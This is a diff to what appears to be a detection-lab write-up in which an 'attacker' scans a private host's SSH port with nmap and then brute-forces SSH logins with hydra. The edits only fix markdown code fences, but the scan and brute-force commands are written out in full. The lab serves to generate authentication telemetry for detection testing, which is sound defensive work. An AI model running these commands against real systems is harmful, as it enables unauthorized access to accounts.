@@ -48,8 +48,9 @@ The scenario is designed to generate authentication-related telemetry and valida
 The attacker first verified SSH service availability on the target system.
 
 ```bash
-nmap -p 22 10.0.0.95
 
+nmap -p 22 10.0.0.95
+```
 ### Result
 PORT STATE SERVICE
 22/tcp open ssh
@@ -62,7 +63,7 @@ After confirming service availability, the attacker launched a credential brute 
 
 ```bash
 hydra -l ubuntu -P passwords.txt ssh://10.0.0.95
-
+```
 
 
 
